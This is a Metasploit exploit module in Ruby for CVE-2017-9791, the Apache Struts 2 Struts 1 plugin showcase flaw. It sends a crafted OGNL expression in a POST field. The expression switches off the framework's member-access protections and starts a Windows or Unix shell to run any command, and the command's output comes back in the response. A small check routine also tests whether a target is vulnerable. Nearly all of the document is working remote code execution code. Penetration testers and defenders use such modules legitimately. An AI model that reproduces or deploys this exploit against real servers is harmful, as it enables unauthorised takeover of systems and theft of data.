##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Apache Struts 2 Struts 1 Plugin Showcase OGNL Code Execution',
      'Description'    => %q{ This module exploits a remote code execution vulnerability in the Struts Showcase app in the Struts 1 plugin example in Struts 2.3.x series. Remote Code Execution can be performed via a malicious field value. },
      'License'        => MSF_LICENSE,
      'Author'         => [
        'icez <ic3z at qq dot com>',
        'Nixawk',
        'xfer0'
      ],
      'References'     => [
        [ 'CVE', '2017-9791' ],
        [ 'BID', '99484' ],
        [ 'EDB', '42324' ],
        [ 'URL', 'https://cwiki.apache.org/confluence/display/WW/S2-048'  ]
      ],
      'Privileged'     => true,
      'Targets'        => [
        [
          'Universal', {
            'Platform'       => %w{ linux unix win },
            'Arch'           => [ ARCH_CMD ]
          }
        ]
      ],
      'DisclosureDate' => 'Jul 07 2017',
    'DefaultTarget'  => 0))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI', [ true, 'The path to a struts application action', '/struts2-showcase/integration/saveGangster.action' ]),
        OptString.new('POSTPARAM', [ true, 'The HTTP POST parameter', 'name' ])
      ]
    )
  end

  def send_struts_request(ognl)
    var_a = rand_text_alpha_lower(4)
    var_b = rand_text_alpha_lower(4)
    uri = normalize_uri(datastore['TARGETURI'])

    data = {
      datastore['POSTPARAM']    => ognl,
      'age'                     => var_a,
      '__checkbox_bustedBefore' => 'true',
      'description'             => var_b
    }

    resp = send_request_cgi({
      'uri'       => uri,
      'method'    => 'POST',
      'vars_post' => data
    })

    if resp && resp.code == 404
      fail_with(Failure::BadConfig, 'Server returned HTTP 404, please double check TARGETURI')
    end
    resp
  end

  def check
    var_a = rand_text_alpha_lower(4)
    var_b = rand_text_alpha_lower(4)
    ognl = "%{'#{var_a}' + '#{var_b}'}"

    begin
      resp = send_struts_request(ognl)
    rescue Msf::Exploit::Failed
      return Exploit::CheckCode::Unknown
    end

    if resp && resp.code == 200 && resp.body.include?("#{var_a}#{var_b}")
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    resp = exec_cmd(payload.encoded)
    unless resp and resp.code == 200
      fail_with(Failure::Unknown, "Exploit failed.")
    end

    print_good("Command executed")
    print_line(resp.body)
  end

  def exec_cmd(cmd)
    ognl = "%{(#_='multipart/form-data')."
    ognl << "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    ognl << "(#_memberAccess?(#_memberAccess=#dm):"
    ognl << "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    ognl << "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    ognl << "(#ognlUtil.getExcludedPackageNames().clear())."
    ognl << "(#ognlUtil.getExcludedClasses().clear())."
    ognl << "(#context.setMemberAccess(#dm))))."
    ognl << "(#cmd='#{cmd}')."
    ognl << "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    ognl << "(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())."
    ognl << "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    ognl << "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

    send_struts_request(ognl)
  end
end
